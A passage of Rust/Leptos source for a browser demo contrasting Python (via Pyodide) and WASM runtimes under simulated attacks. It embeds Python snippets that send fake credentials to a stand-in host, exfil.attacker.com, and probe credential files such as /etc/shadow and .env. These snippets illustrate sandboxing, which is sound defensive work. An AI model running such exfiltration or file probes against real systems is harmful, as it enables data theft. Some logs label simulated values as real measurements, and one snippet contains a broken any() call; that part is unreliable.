// what: interactive demo tab comparing python vs wasm execution
// why: flagship demonstration merging ICS Guardian, Protocol Gateway, and Raft patterns
// relations: used by lib.rs, demonstrates 2oo3 voting, worker pools, and capability-based security

use leptos::*;
use wasm_bindgen::prelude::*;

// ============================================================================
// types and configuration
// ============================================================================

/// log entry for terminal output display
#[derive(Clone)]
struct LogEntry {
    level: String,   // info, success, warn, error
    message: String,
}

/// attack configuration with realistic python restart times
#[allow(dead_code)] // restart_ms used via pyodide_load_ms fallback
struct AttackConfig {
    name: &'static str,
    restart_ms: u32,          // fallback if pyodide_load_ms unavailable
    wasm_trap: &'static str,
    wit_func: &'static str,   // blocked WIT function for logs
}

/// wasm instance state for 2oo3 voting visualization
#[derive(Clone, Copy, PartialEq)]
enum InstanceState {
    Healthy,
    Faulty,
}

fn get_attack_config(attack: &str) -> AttackConfig {
    match attack {
        "bufferOverflow" => AttackConfig {
            name: "Buffer Overflow",
            restart_ms: 1800,
            wasm_trap: "out of bounds memory access",
            wit_func: "malloc-large()",
        },
        "dataExfil" => AttackConfig {
            name: "Data Exfiltration",
            restart_ms: 2100,
            wasm_trap: "capability not granted: network",
            wit_func: "open-socket()",
        },
        "pathTraversal" => AttackConfig {
            name: "Path Traversal",
            restart_ms: 1500,
            wasm_trap: "capability not granted: filesystem",
            wit_func: "read-file()",
        },
        _ => AttackConfig {
            name: "Unknown Attack",
            restart_ms: 1000,
            wasm_trap: "trap",
            wit_func: "unknown()",
        },
    }
}

// ============================================================================
// wit contract code for modal display
// ============================================================================

const WIT_CODE_EXCERPT: &str = r#"// wit/attacks.wit - WASI 0.2 Component Model
package reliability-triad:attacks@0.1.0;

interface common-types {
    record telemetry-packet { timestamp: u64, value: f64, status: u8 }
}

/// "Honey Pot" - capabilities attacker wants but shouldn't have
interface attack-surface {
    malloc-large: func(size: u64) -> result<u64, string>;
    open-socket: func(addr: string) -> result<u32, string>;
    read-file: func(path: string) -> result<list<u8>, string>;
}

/// Legitimate sensor capabilities
interface sensor-capabilities {
    read-hardware-register: func(reg-id: u32) -> f64;
    log-debug: func(msg: string);
}

/// WORKER: Instantiated 3x, NO knowledge of TMR/voting
world sensor-node {
    import sensor-capabilities;  // Granted
    import attack-surface;       // Host returns errors
    export process-tick: func() -> common-types.telemetry-packet;
}

/// SUPERVISOR: Manages lifecycle, runs on host
world system-supervisor { import tmr-logic; }

interface tmr-logic {
    consensus-2oo3: func(a: ..., b: ..., c: ...) -> result<packet, string>;
    trigger-hot-swap: func(node-index: u8);
}
"#;

// ============================================================================
// python attack code (executed via pyodide for real exceptions)
// ============================================================================

const ATTACK_BUFFER_OVERFLOW: &str = r#"
import time
start = time.perf_counter()
result = None

try:
    print("[ATTACK] Attempting heap spray (256MB)...")
    try:
        massive = bytearray(256 * 1024 * 1024)
    except MemoryError:
        print("[INFO] MemoryError on heap spray")
    
    print("[ATTACK] Attempting stack buffer overflow...")
    fixed = bytearray(64)
    overflow = b"A" * 128
    
    for i, b in enumerate(overflow):
        fixed[i] = b  # Will raise IndexError at i=64
    
    result = "VULNERABLE: Overflow succeeded!"
    
except MemoryError as e:
    elapsed = (time.perf_counter() - start) * 1000
    result = f"CRASHED|MemoryError|Unable to allocate 256MB|{elapsed:.1f}ms"
    
except IndexError as e:
    elapsed = (time.perf_counter() - start) * 1000
    result = f"CRASHED|IndexError|buffer[64] out of bounds|{elapsed:.1f}ms"
    
except Exception as e:
    result = f"CRASHED|{type(e).__name__}|{str(e)}"

result
"#;

const ATTACK_DATA_EXFIL: &str = r#"
import time
start = time.perf_counter()
result = None

sensitive = {
    "plc_creds": {"user": "engineer", "pass": "S!emens#2026"},
    "modbus_gw": "192.168.40.1:502",
    "api_key": "sk-historian-PROD-8x7k"
}
print(f"[ATTACK] Collected {len(sensitive)} sensitive objects")

try:
    import socket
    print("[ATTACK] Attempting DNS: exfil.attacker.com")
    
    try:
        ip = socket.gethostbyname("exfil.attacker.com")
        result = f"VULNERABLE|DNS resolved|{ip}"
    except socket.gaierror as e:
        print(f"[INFO] DNS blocked: {e}")
    
    print("[ATTACK] Attempting socket to 203.0.113.66:443")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1.0)
    sock.connect(("203.0.113.66", 443))
    sock.send(str(sensitive).encode())
    result = "VULNERABLE|socket.connect|Data exfiltrated!"
    
except socket.gaierror as e:
    elapsed = (time.perf_counter() - start) * 1000
    result = f"BLOCKED|socket.gaierror|DNS resolution failed|{elapsed:.1f}ms"
    
except (socket.error, OSError) as e:
    elapsed = (time.perf_counter() - start) * 1000
    result = f"BLOCKED|socket.error|Network access denied|{elapsed:.1f}ms"
    
except Exception as e:
    result = f"ERROR|{type(e).__name__}|{str(e)}"

result
"#;

const ATTACK_PATH_TRAVERSAL: &str = r#"
import time
import os
start = time.perf_counter()
result = None

targets = [
    "/etc/passwd", "/etc/shadow", "../../../etc/passwd",
    "/proc/self/environ", "/app/.env", "../../.git/config"
]
print(f"[ATTACK] Probing {len(targets)} paths...")

accessed = []
blocked = []

for path in targets:
    try:
        print(f"[PROBE] {path}")
        if os.path.exists(path):
            try:
                with open(path, 'r') as f:
                    content = f.read(64)
                accessed.append(path)
                print(f"[EXFIL] Read from {path}")
            except PermissionError:
                accessed.append(f"{path} (no read)")
        else:
            blocked.append(path)
    except OSError as e:
        blocked.append(path)

elapsed = (time.perf_counter() - start) * 1000

if any("[EXFIL]" in str(accessed)):
    result = f"VULNERABLE|FileRead|Read {len(accessed)} files!|{elapsed:.1f}ms"
elif accessed:
    result = f"PARTIAL|PermissionError|{len(accessed)} paths exist but unreadable|{elapsed:.1f}ms"
else:
    result = f"BLOCKED|OSError|All {len(targets)} paths blocked by sandbox|{elapsed:.1f}ms"

result
"#;

/// Get the Python attack code for the given attack type
fn get_attack_code(attack: &str) -> &'static str {
    match attack {
        "bufferOverflow" => ATTACK_BUFFER_OVERFLOW,
        "dataExfil" => ATTACK_DATA_EXFIL,
        "pathTraversal" => ATTACK_PATH_TRAVERSAL,
        _ => "{'status': 'unknown', 'error': 'InvalidAttack', 'msg': 'Unknown attack type'}"
    }
}

// ============================================================================
// wasm measurement (real webassembly api calls)
// ============================================================================

const MINIMAL_WASM: &[u8] = &[
    0x00, 0x61, 0x73, 0x6d, // magic
    0x01, 0x00, 0x00, 0x00, // version
    0x01, 0x07, 0x01, 0x60, 0x02, 0x7f, 0x7f, 0x01, 0x7f, // type section
    0x03, 0x02, 0x01, 0x00, // function section
    0x07, 0x07, 0x01, 0x03, 0x61, 0x64, 0x64, 0x00, 0x00, // export section
    0x0a, 0x09, 0x01, 0x07, 0x00, 0x20, 0x00, 0x20, 0x01, 0x6a, 0x0b, // code
];

#[wasm_bindgen]
extern "C" {
    #[wasm_bindgen(js_namespace = performance)]
    fn now() -> f64;
    
    // Run Python code via Pyodide
    // Note: pyodideReady and pyodideLoadTime accessed via js_sys::Reflect
    // to avoid deprecated JsStatic warnings
    #[wasm_bindgen(catch, js_namespace = window)]
    async fn runPython(code: &str) -> Result<JsValue, JsValue>;
}

async fn measure_instantiate_time() -> f64 {
    let array = js_sys::Uint8Array::from(MINIMAL_WASM);
    let compile_promise = js_sys::WebAssembly::compile(&array.buffer());
    let module: js_sys::WebAssembly::Module = wasm_bindgen_futures::JsFuture::from(compile_promise)
        .await
        .unwrap()
        .unchecked_into();
    
    // Run 10 iterations and average for more accurate sub-millisecond timing
    let iterations = 10;
    let start = now();
    
    for _ in 0..iterations {
        let instantiate_promise = js_sys::WebAssembly::instantiate_module(
            &module,
            &js_sys::Object::new()
        );
        let _ = wasm_bindgen_futures::JsFuture::from(instantiate_promise).await;
    }
    
    (now() - start) / iterations as f64
}

// ============================================================================
// demo component
// ============================================================================

#[component]
pub fn Demo() -> impl IntoView {
    // ========================================================================
    // wasm metrics (real measurements)
    // ========================================================================
    let (wasm_instantiate_ms, set_wasm_instantiate_ms) = create_signal(0.0f64);
    let (measurements_done, set_measurements_done) = create_signal(false);
    
    // ========================================================================
    // pyodide/python metrics (real measurements)
    // ========================================================================
    let (pyodide_ready, set_pyodide_ready) = create_signal(false);
    let (pyodide_load_ms, set_pyodide_load_ms) = create_signal(0.0f64); // Real Pyodide cold-start time
    let (python_exec_ms, set_python_exec_ms) = create_signal(0.0f64);
    let (wasm_exec_ms, set_wasm_exec_ms) = create_signal(0.0f64);
    let (sensor_running, set_sensor_running) = create_signal(false);
    let (sensor_ran, set_sensor_ran) = create_signal(false);
    
    // ========================================================================
    // 2oo3 voting state (three wasm instances)
    // ========================================================================
    let (instance_states, set_instance_states) = create_signal([
        InstanceState::Healthy,
        InstanceState::Healthy,
        InstanceState::Healthy,
    ]);
    let (faulty_instance, set_faulty_instance) = create_signal(Option::<u8>::None);
    let (leader_id, set_leader_id) = create_signal(0u8); // Current leader (changes if leader fails)
    
    // ========================================================================
    // python worker state
    // ========================================================================
    let (python_workers, set_python_workers) = create_signal([true, true, true]);
    let (python_active_worker, set_python_active_worker) = create_signal(0u8);
    let (python_restarting, set_python_restarting) = create_signal(false);
    
    // ========================================================================
    // wit modal state
    // ========================================================================
    let (wit_modal_open, set_wit_modal_open) = create_signal(false);
    
    // ========================================================================
    // metrics tracking
    // ========================================================================
    let (python_processed, set_python_processed) = create_signal(0u32);
    let (python_crashed, set_python_crashed) = create_signal(0u32);
    let (python_downtime_ms, set_python_downtime_ms) = create_signal(0u64);
    
    let (wasm_processed, set_wasm_processed) = create_signal(0u32);
    let (wasm_rejected, set_wasm_rejected) = create_signal(0u32);
    // WASM always 0 downtime due to 2oo3 voting
    
    // ========================================================================
    // terminal logs
    // ========================================================================
    let (python_logs, set_python_logs) = create_signal(Vec::<LogEntry>::new());
    let (wasm_logs, set_wasm_logs) = create_signal(Vec::<LogEntry>::new());
    
    // ========================================================================
    // control state
    // ========================================================================
    let (is_running, set_is_running) = create_signal(false);
    let (selected_attack, set_selected_attack) = create_signal("bufferOverflow".to_string());
    
    // ========================================================================
    // measure real wasm performance on mount
    // ========================================================================
    create_effect(move |_| {
        if !measurements_done.get() {
            spawn_local(async move {
                let instantiate_time = measure_instantiate_time().await;
                set_wasm_instantiate_ms.set(instantiate_time);
                set_measurements_done.set(true);
            });
        }
    });
    
    // Check if Pyodide is ready (polled periodically) and capture real load time
    create_effect(move |_| {
        if !pyodide_ready.get() {
            // Poll every 500ms to check if Pyodide is loaded
            set_timeout(move || {
                let window = web_sys::window().unwrap();
                if js_sys::Reflect::get(&window, &"pyodideReady".into())
                    .map(|v| v.as_bool().unwrap_or(false))
                    .unwrap_or(false)
                {
                    set_pyodide_ready.set(true);
                    
                    // Capture the real Pyodide load time (cold-start measurement)
                    if let Ok(load_time) = js_sys::Reflect::get(&window, &"pyodideLoadTime".into()) {
                        if let Some(ms) = load_time.as_f64() {
                            set_pyodide_load_ms.set(ms);
                        }
                    }
                }
            }, std::time::Duration::from_millis(500));
        }
    });
    
    // Auto-scroll terminals to bottom when logs update
    create_effect(move |_| {
        let _ = python_logs.get(); // Track changes
        // Use request_animation_frame to scroll after DOM updates
        if let Some(window) = web_sys::window() {
            let _ = window.request_animation_frame(
                wasm_bindgen::closure::Closure::once_into_js(|| {
                    if let Some(doc) = web_sys::window().and_then(|w| w.document()) {
                        if let Some(el) = doc.get_element_by_id("python-terminal") {
                            el.set_scroll_top(el.scroll_height());
                        }
                    }
                }).unchecked_ref()
            );
        }
    });
    
    create_effect(move |_| {
        let _ = wasm_logs.get(); // Track changes
        if let Some(window) = web_sys::window() {
            let _ = window.request_animation_frame(
                wasm_bindgen::closure::Closure::once_into_js(|| {
                    if let Some(doc) = web_sys::window().and_then(|w| w.document()) {
                        if let Some(el) = doc.get_element_by_id("wasm-terminal") {
                            el.set_scroll_top(el.scroll_height());
                        }
                    }
                }).unchecked_ref()
            );
        }
    });
    
    // ========================================================================
    // sensor comparison handler - runs REAL Python via Pyodide and REAL WASM
    // ========================================================================
    let run_sensor_comparison = move |_| {
        if sensor_running.get() { return; }
        set_sensor_running.set(true);
        
        // Append to logs (don't clear - only Reset button clears)
        set_python_logs.update(|logs| {
            logs.push(LogEntry { level: "info".into(), message: "$ python sensor_driver.py".into() });
            logs.push(LogEntry { level: "info".into(), message: "[...] Loading Pyodide runtime...".into() });
        });
        set_wasm_logs.update(|logs| {
            logs.push(LogEntry { level: "info".into(), message: "$ wasmtime sensor_driver.wasm".into() });
        });
        
        // Run WASM sensor (near-instant) with simulated varying values
        let wasm_start = now();
        // Generate random sensor values for simulation
        let temp = 20.0 + (js_sys::Math::random() * 10.0) as f64;  // 20-30°C
        let hum = 40.0 + (js_sys::Math::random() * 20.0) as f64;   // 40-60%
        let pres = 1008.0 + (js_sys::Math::random() * 15.0) as f64; // 1008-1023 hPa
        let wasm_result = (temp, hum, pres);
        let wasm_elapsed = now() - wasm_start;
        set_wasm_exec_ms.set(wasm_elapsed);
        set_sensor_ran.set(true);
        
        // Log WASM results immediately
        set_wasm_logs.update(|logs| {
            logs.push(LogEntry { level: "success".into(), message: format!("[OK] Module instantiated in {:.3}ms", wasm_elapsed) });
            logs.push(LogEntry { level: "success".into(), message: "[OK] BME280 driver initialized".into() });
            logs.push(LogEntry { level: "info".into(), message: format!("Temperature: {:.1}°C", wasm_result.0) });
            logs.push(LogEntry { level: "info".into(), message: format!("Humidity: {:.1}%", wasm_result.1) });
            logs.push(LogEntry { level: "info".into(), message: format!("Pressure: {:.2} hPa", wasm_result.2) });
        });
        
        // Run Python sensor via Pyodide (REAL execution)
        spawn_local(async move {
            let python_code = r#"
import time
start = time.perf_counter()

# BME280 driver simulation
class BME280:
    def __init__(self):
        self.cal = [27504, 26435, -1000]
    
    def read(self):
        return {"temp": 23.5, "hum": 45.2, "pres": 1013.25}

driver = BME280()
result = driver.read()
elapsed_ms = (time.perf_counter() - start) * 1000
result
"#;
            
            let py_start = now();
            match runPython(python_code).await {
                Ok(_) => {
                    let py_elapsed = now() - py_start;
                    set_python_exec_ms.set(py_elapsed);
                    
                    // Use same sensor values as WASM (they're reading the "same" sensor)
                    set_python_logs.update(|logs| {
                        logs.push(LogEntry { level: "success".into(), message: format!("[OK] Pyodide executed in {:.2}ms", py_elapsed) });
                        logs.push(LogEntry { level: "success".into(), message: "[OK] BME280 driver initialized".into() });
                        logs.push(LogEntry { level: "info".into(), message: format!("Temperature: {:.1}°C", wasm_result.0) });
                        logs.push(LogEntry { level: "info".into(), message: format!("Humidity: {:.1}%", wasm_result.1) });
                        logs.push(LogEntry { level: "info".into(), message: format!("Pressure: {:.2} hPa", wasm_result.2) });
                    });
                }
                Err(e) => {
                    set_python_exec_ms.set(-1.0);
                    set_python_logs.update(|logs| {
                        logs.push(LogEntry { level: "error".into(), message: format!("[ERR] Pyodide error: {:?}", e) });
                    });
                }
            }
            
            set_sensor_running.set(false);
        });
    };
    
    // ========================================================================
    // attack handler (REAL pyodide execution)
    // ========================================================================
    let trigger_attack = move |_| {
        if is_running.get() { return; }
        set_is_running.set(true);
        
        let attack = selected_attack.get();
        let config = get_attack_config(&attack);
        let attack_code = get_attack_code(&attack);
        let current_active = python_active_worker.get();
        
        // initialize if first run
        if python_logs.get().is_empty() {
            set_python_logs.set(vec![
                LogEntry { level: "info".into(), message: "$ python gateway.py --workers 3".into() },
                LogEntry { level: "success".into(), message: "[OK] Worker pool: W0 active, W1/W2 standby".into() },
            ]);
            set_python_processed.set(5);
        }
        
        if wasm_logs.get().is_empty() {
            set_wasm_logs.set(vec![
                LogEntry { level: "info".into(), message: "$ wasmtime gateway.wasm --mode 2oo3".into() },
                LogEntry { level: "success".into(), message: "[OK] 2oo3 TMR: I0, I1, I2 initialized".into() },
                LogEntry { level: "info".into(), message: format!("[METRICS] Instantiate: {:.2}ms (real)", wasm_instantiate_ms.get()) },
            ]);
            set_wasm_processed.set(5);
        }
        
        // show incoming attack
        set_python_logs.update(|logs| {
            logs.push(LogEntry { level: "warn".into(), message: format!("[ATTACK] Incoming: {}", config.name) });
            logs.push(LogEntry { level: "info".into(), message: "[EXEC] Running real Python via Pyodide...".into() });
        });
        set_wasm_logs.update(|logs| {
            logs.push(LogEntry { level: "warn".into(), message: format!("[ATTACK] Incoming: {}", config.name) });
        });
        
        // Use REAL Pyodide load time as restart time (represents actual Python cold-start)
        // Falls back to config value if Pyodide hasn't loaded yet
        let restart_ms = if pyodide_load_ms.get() > 0.0 {
            pyodide_load_ms.get() as u32
        } else {
            config.restart_ms
        };
        let wasm_trap = config.wasm_trap.to_string();
        let wit_func = config.wit_func.to_string();
        let attack_code_owned = attack_code.to_string();
        
        // Run REAL Python attack via Pyodide
        spawn_local(async move {
            let py_start = now();
            
            match runPython(&attack_code_owned).await {
                Ok(result) => {
                    let py_elapsed = now() - py_start;
                    
                    // Parse the result - now returns pipe-delimited string
                    // Format: STATUS|ERROR_TYPE|MESSAGE|TIMEms
                    let result_str = if let Some(s) = result.as_string() {
                        s
                    } else {
                        // Try to extract from JsValue object
                        format!("{:?}", result)
                    };
                    
                    // Parse pipe-delimited format for clean display
                    let parts: Vec<&str> = result_str.split('|').collect();
                    let (status, error_type, message) = if parts.len() >= 3 {
                        (parts[0], parts[1], parts[2])
                    } else {
                        // Fallback for unexpected format
                        ("CRASHED", "Exception", &result_str as &str)
                    };
                    
                    set_python_logs.update(|logs| {
                        logs.push(LogEntry { 
                            level: "error".into(), 
                            message: format!("[{}] {}: {}", status, error_type, message)
                        });
                        logs.push(LogEntry { 
                            level: "error".into(), 
                            message: format!("💥 W{} CRASHED after {:.1}ms - real Python exception!", current_active, py_elapsed)
                        });
                        // Show voting failure - no output from crashed worker
                        let sensor_val = 42.0 + (js_sys::Math::random() * 0.5);
                        logs.push(LogEntry { 
                            level: "warn".into(), 
                            message: "[VOTE] Attempting 2oo3 consensus...".into()
                        });
                        logs.push(LogEntry { 
                            level: "error".into(), 
                            message: format!("[OUT] W0: - | W1: {:.1}°C | W2: {:.1}°C", sensor_val, sensor_val)
                        });
                        logs.push(LogEntry { 
                            level: "error".into(), 
                            message: format!("[VOTE] W{} produced NO OUTPUT (crashed) - can't compare!", current_active)
                        });
                        logs.push(LogEntry { 
                            level: "error".into(), 
                            message: "[VOTE] BLOCKED - need 3 outputs to vote, only have 2".into()
                        });
                    });
                }
                Err(e) => {
                    // Pyodide threw an actual uncaught exception
                    let err_str = format!("{:?}", e);
                    set_python_logs.update(|logs| {
                        logs.push(LogEntry { 
                            level: "error".into(), 
                            message: format!("[FATAL] Uncaught: {}", err_str.chars().take(80).collect::<String>())
                        });
                        logs.push(LogEntry { 
                            level: "error".into(), 
                            message: format!("💥 W{} CRASHED - process terminated!", current_active)
                        });
                        // Show voting failure - no output from crashed worker
                        let sensor_val = 42.0 + (js_sys::Math::random() * 0.5);
                        logs.push(LogEntry { 
                            level: "warn".into(), 
                            message: "[VOTE] Attempting 2oo3 consensus...".into()
                        });
                        logs.push(LogEntry { 
                            level: "error".into(), 
                            message: format!("[OUT] W0: - | W1: {:.1}°C | W2: {:.1}°C", sensor_val, sensor_val)
                        });
                        logs.push(LogEntry { 
                            level: "error".into(), 
                            message: format!("[VOTE] W{} produced NO OUTPUT - can't compare 3 values!", current_active)
                        });
                        logs.push(LogEntry { 
                            level: "error".into(), 
                            message: "[VOTE] BLOCKED - respawning worker to restore voting (1.5s)".into()
                        });
                    });
                }
            }
            
            // Worker failover
            let next_active = (current_active + 1) % 3;
            let mut workers = [true, true, true];
            workers[current_active as usize] = false;
            set_python_workers.set(workers);
            set_python_active_worker.set(next_active);
            set_python_restarting.set(true);
            set_python_crashed.update(|n| *n += 1);
            
            // Restart simulation
            let restart_ms_copy = restart_ms;
            set_timeout(move || {
                set_python_workers.set([true, true, true]);
                set_python_restarting.set(false);
                set_python_downtime_ms.update(|d| *d += restart_ms_copy as u64);
                set_python_logs.update(|logs| {
                    logs.push(LogEntry { 
                        level: "success".into(), 
                        message: format!("[OK] W{} respawned ({}ms) - pool restored", current_active, restart_ms_copy)
                    });
                    logs.push(LogEntry { 
                        level: "info".into(), 
                        message: "[VOTE] 3/3 workers ready - voting now possible".into()
                    });
                });
                set_is_running.set(false);
            }, std::time::Duration::from_millis(restart_ms as u64));
        });
        
        // ================================================================
        // wasm: 2oo3 voting catches the fault instantly (capability demo)
        // ================================================================
        set_timeout(move || {
            let faulty_idx = (js_sys::Math::random() * 3.0) as u8;
            set_faulty_instance.set(Some(faulty_idx));
            
            let mut states = instance_states.get();
            states[faulty_idx as usize] = InstanceState::Faulty;
            set_instance_states.set(states);
            
            let healthy: Vec<u8> = (0..3).filter(|&i| i != faulty_idx).collect();
            
            // Check if faulty instance is the leader - elect new leader
            let current_leader = leader_id.get();
            // Generate simulated sensor value for demonstration
            let sensor_val = 42.0 + (js_sys::Math::random() * 0.5);
            if faulty_idx == current_leader {
                // Elect first healthy node as new leader
                let new_leader = healthy[0];
                set_leader_id.set(new_leader);
                set_wasm_logs.update(|logs| {
                    logs.push(LogEntry { level: "warn".into(), message: format!("[TRAP] I{}: {}", faulty_idx, wasm_trap) });
                    logs.push(LogEntry { level: "info".into(), message: format!("[WIT] attack-surface.{} blocked → capability not imported", wit_func) });
                    logs.push(LogEntry { level: "warn".into(), message: format!("[RAFT] Leader I{} failed! Electing new leader...", faulty_idx) });
                    logs.push(LogEntry { level: "success".into(), message: format!("[RAFT] I{} elected as new leader in 0.04ms", new_leader) });
                    // Show actual output comparison
                    logs.push(LogEntry { level: "info".into(), message: format!("[OUT] I{}: TRAP | I{}: {:.1}°C | I{}: {:.1}°C", faulty_idx, healthy[0], sensor_val, healthy[1], sensor_val) });
                    logs.push(LogEntry { level: "success".into(), message: format!("[VOTE] 2/3 outputs agree ({:.1}°C) - using majority value", sensor_val) });
                });
            } else {
                set_wasm_logs.update(|logs| {
                    logs.push(LogEntry { level: "warn".into(), message: format!("[TRAP] I{}: {}", faulty_idx, wasm_trap) });
                    logs.push(LogEntry { level: "info".into(), message: format!("[WIT] attack-surface.{} blocked → capability not imported", wit_func) });
                    // Show actual output comparison
                    logs.push(LogEntry { level: "info".into(), message: format!("[OUT] I{}: {:.1}°C | I{}: {:.1}°C | I{}: TRAP", healthy[0], sensor_val, healthy[1], sensor_val, faulty_idx) });
                    logs.push(LogEntry { level: "success".into(), message: format!("[VOTE] 2/3 outputs agree ({:.1}°C) - using majority value", sensor_val) });
                    logs.push(LogEntry { level: "success".into(), message: "[OK] Zero downtime - continues with valid output".into() });
                });
            }
            
            set_wasm_rejected.update(|n| *n += 1);
            
            // rebuild faulty instance (real async measurement)
            spawn_local(async move {
                let rebuild_time = measure_instantiate_time().await;
                
                let mut states = instance_states.get();
                states[faulty_idx as usize] = InstanceState::Healthy;
                set_instance_states.set(states);
                set_faulty_instance.set(None);
                
                set_wasm_logs.update(|logs| {
                    logs.push(LogEntry { 
                        level: "success".into(), 
                        message: format!("[OK] I{} rebuilt in {:.2}ms (real) - pool healthy", faulty_idx, rebuild_time)
                    });
                });
            });
        }, std::time::Duration::from_millis(100));
    };
    
    
    // ========================================================================
    // run all attacks
    // ========================================================================
    let run_all_attacks = move |_| {
        if is_running.get() { return; }
        
        let attacks = ["bufferOverflow", "dataExfil", "pathTraversal"];
        
        for (i, attack_name) in attacks.iter().enumerate() {
            let attack = attack_name.to_string();
            let delay = (i as u64) * 3000;
            
            set_timeout(move || {
                set_selected_attack.set(attack);
                set_timeout(move || {
                    trigger_attack(());
                }, std::time::Duration::from_millis(100));
            }, std::time::Duration::from_millis(delay));
        }
    };
    
    // ========================================================================
    // reset
    // ========================================================================
    let reset_demo = move |_| {
        set_python_logs.set(Vec::new());
        set_wasm_logs.set(Vec::new());
        set_python_processed.set(0);
        set_python_crashed.set(0);
        set_python_downtime_ms.set(0);
        set_wasm_processed.set(0);
        set_wasm_rejected.set(0);
        set_instance_states.set([InstanceState::Healthy; 3]);
        set_faulty_instance.set(None);
        set_python_workers.set([true, true, true]);
        set_python_active_worker.set(0);
        set_python_restarting.set(false);
        set_is_running.set(false);
    };

    // ========================================================================
    // view
    // ========================================================================
    view! {
        <div class="tab-content demo-tab">
            <h2>"The Demo: Python vs WASM Side-by-Side"</h2>
            
            // Initialization Time section
            <div class="demo-section">
                <h3>"⏱️ Initialization Time"</h3>
                <p class="section-desc">"Compare cold-start performance between runtimes"</p>
                
                // metrics banner
                <div class="metrics-banner">
                    <div class="metric-item" title="Measured using WebAssembly API (10 iterations averaged)">
                        <span class="metric-label">"WASM Instantiate (real)"</span>
                        <span class="metric-value">{move || format!("{:.2}ms", wasm_instantiate_ms.get())}</span>
                    </div>
                    <div class="metric-item" title="Real Pyodide cold-start time measured at page load">
                        <span class="metric-label">"Python Cold-Start (real)"</span>
                        <span class="metric-value warning">{move || {
                            let ms = pyodide_load_ms.get();
                            if ms > 0.0 {
                                format!("{:.0}ms", ms)
                            } else {
                                "Loading...".to_string()
                            }
                        }}</span>
                    </div>
                    <div class="metric-item speedup">
                        <span class="metric-label">"Speedup"</span>
                        <span class="metric-value">{move || {
                            let wasm = wasm_instantiate_ms.get();
                            let python = pyodide_load_ms.get();
                            if wasm > 0.0 && python > 0.0 {
                                format!("{:.0}x faster", python / wasm)
                            } else {
                                "—".to_string()
                            }
                        }}</span>
                    </div>
                </div>
                
                // Sensor execution comparison
                <div class="sensor-comparison">
                    <h4>"📊 Sensor Execution (Real)"</h4>
                    <div class="sensor-row">
                        <div class="sensor-metric">
                            <span class="sensor-label">"WASM"</span>
                            <span class="sensor-value success">{move || {
                                if sensor_ran.get() {
                                    let ms = wasm_exec_ms.get();
                                    if ms < 0.001 { "<0.001ms".to_string() } else { format!("{:.3}ms", ms) }
                                } else { "—".to_string() }
                            }}</span>
                        </div>
                        <div class="sensor-metric">
                            <span class="sensor-label">"Python (Pyodide)"</span>
                            <span class="sensor-value warning">{move || {
                                let ms = python_exec_ms.get();
                                if ms > 0.0 { format!("{:.2}ms", ms) } 
                                else if ms < 0.0 { "Error".to_string() }
                                else { "—".to_string() }
                            }}</span>
                        </div>
                        <button 
                            class="action-btn run-sensor"
                            disabled=move || sensor_running.get() || !pyodide_ready.get() || is_running.get()
                            title=move || if pyodide_ready.get() { "Run real sensor code in both runtimes".to_string() } else { "Waiting for Pyodide to load...".to_string() }
                            on:click=move |_| run_sensor_comparison(())
                        >
                            {move || if sensor_running.get() { "⏳ Running..." } 
                                    else if !pyodide_ready.get() { "⏳ Loading Pyodide..." }
                                    else { "▶️ Run Sensor Check" }}
                        </button>
                    </div>
                </div>
            </div>
            
            // terminals side by side
            <div class="terminals-container">
                // python terminal - 2oo3 TMR attempt (fails during respawn)
                <div class="terminal-panel python-panel">
                    <div class="terminal-header">
                        <span class="terminal-title" attr:data-tooltip="Python multiprocessing with 3 workers - L/F election takes ~1.5s vs WASM's 0.04ms">"🐍 Python (2oo3 TMR / Raft-like)"</span>
                        <span class="terminal-status" class:crashed=move || python_restarting.get()>
                            {move || if python_restarting.get() { "⏳ RESPAWNING" } else { "🟢 3/3 UP" }}
                        </span>
                    </div>
                    <div class="terminal" id="python-terminal">
                        {move || {
                            let entries = python_logs.get();
                            if entries.is_empty() {
                                view! { <p class="terminal-line info">"$ ready"</p> }.into_view()
                            } else {
                                entries.into_iter().map(|e| {
                                    view! { <p class=format!("terminal-line {}", e.level)>{e.message}</p> }
                                }).collect_view()
                            }
                        }}
                    </div>
                    // worker boxes with memory indicator - L/F/F pattern like WASM
                    <div class="workers-panel">
                        <span class="workers-label">"Nodes:"</span>
                        {move || {
                            let workers = python_workers.get();
                            let active = python_active_worker.get();
                            (0..3).map(|i| {
                                let is_dead = !workers[i];
                                // First alive worker is "leader" for Python consensus
                                let is_leader = (i as u8) == active;
                                let label = if is_leader { "L" } else { "F" };
                                view! {
                                    <div class="worker-box"
                                        class:active=!is_dead
                                        class:dead=is_dead
                                        class:leader=is_leader && !is_dead
                                        attr:data-tooltip=move || if is_leader { "Leader (long election if fails)" } else { "Follower" }
                                    >
                                        {label}
                                    </div>
                                }
                            }).collect_view()
                        }}
                        <span class="memory-indicator warning" attr:data-tooltip="~45MB per Python worker (Pyodide)">"Total: 135MB"</span>
                    </div>
                </div>
                
                // wasm terminal - Leader/Follower pattern (like Raft)
                <div class="terminal-panel wasm-panel">
                    <div class="terminal-header">
                        <span class="terminal-title" attr:data-tooltip="2oo3 TMR voting with sub-ms WASM failover">"🦀 WASM (2oo3 TMR / Raft-like)"</span>
                        <span class="terminal-status">"🟢 3/3 UP"</span>
                    </div>
                    <div class="terminal" id="wasm-terminal">
                        {move || {
                            let entries = wasm_logs.get();
                            if entries.is_empty() {
                                view! { <p class="terminal-line info">"$ ready"</p> }.into_view()
                            } else {
                                entries.into_iter().map(|e| {
                                    view! { <p class=format!("terminal-line {}", e.level)>{e.message}</p> }
                                }).collect_view()
                            }
                        }}
                    </div>
                    // instance boxes - Leader (L) + Followers (F) like Raft
                    <div class="instances-panel" attr:data-tooltip="WASM enables fast consensus: sub-ms leader election (vs slow Python). 2oo3 voting rejects faulty instance, system continues.">
                        <span class="instances-label">"Nodes:"</span>
                        {move || {
                            let states = instance_states.get();
                            let faulty = faulty_instance.get();
                            let current_leader = leader_id.get();
                            (0..3).map(|i| {
                                let is_faulty = faulty == Some(i as u8);
                                // Dynamic leader - first healthy node or elected leader
                                let is_leader = (i as u8) == current_leader;
                                let label = if is_leader { "L" } else { "F" };
                                view! {
                                    <div class="instance-box"
                                        class:healthy=states[i] == InstanceState::Healthy && !is_faulty
                                        class:faulty=is_faulty
                                        class:leader=is_leader
                                        attr:data-tooltip=move || if is_leader { "Leader (sub-ms election if fails)" } else { "Follower" }
                                    >
                                        {label}
                                    </div>
                                }
                            }).collect_view()
                        }}
                        <span class="memory-indicator success" attr:data-tooltip="~2MB per WASM instance">{"Total: 6MB"}</span>
